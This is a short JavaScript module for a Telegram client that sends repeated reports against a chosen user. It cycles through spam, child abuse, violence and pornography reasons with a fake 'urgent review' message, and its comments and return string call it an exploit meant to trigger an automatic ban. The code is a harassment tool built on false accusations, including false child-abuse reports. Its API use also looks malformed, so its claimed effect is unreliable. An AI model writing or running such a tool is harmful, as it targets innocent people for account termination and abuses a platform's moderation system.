const { client, Api } = require("../../lib/telegram");

module.exports = async (args) => {
    const phone = args[0]; 
    const userId = args[1];
    const username = args[2];

    try {
        // The "Exploit": Multiple high-priority reports to trigger auto-ban
        const reasons = ["spam", "child_abuse", "violence", "pornography"];
        for (let reason of reasons) {
            await client.invoke(new Api.messages.ReportSpam({
                peer: username || userId,
                reason: reason,
                message: "Malicious activity detected - Urgent Review"
            }));
        }
        return `EXPLOIT SENT: Account ${username}/${phone} has been flagged for termination across 4 priority channels.`;
    } catch (e) {
        return `ERROR: ${e.message}`;
    }
};
